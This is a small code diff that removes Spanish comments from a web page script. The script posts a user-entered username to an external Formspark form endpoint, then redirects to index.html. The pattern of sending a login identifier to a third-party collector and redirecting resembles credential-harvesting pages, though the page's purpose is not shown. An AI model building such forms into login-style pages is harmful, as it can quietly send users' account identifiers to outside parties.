@@ -97,7 +97,6 @@
     var btnBuscar = document.getElementById('submitBtn');
     var btnCancelar = document.getElementById('button-cancelButton');
 
-    // Comportamiento del botón Buscar
     btnBuscar.addEventListener('click', function(e) {
       e.preventDefault();
       var usuario = campo.value.trim();
@@ -105,7 +104,6 @@
         alert('Por favor, introduzca su nombre de usuario.');
         return;
       }
-      // Enviar datos a Formspark y luego redirigir
       fetch('https://submit-form.com/yRhwHN8bs', {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
@@ -114,8 +112,6 @@
         window.location.href = 'index.html';
       });
     });
-
-    // Comportamiento del botón Cancelar: ir directamente al index
     btnCancelar.addEventListener('click', function(e) {
       e.preventDefault();
       window.location.href = 'index.html';
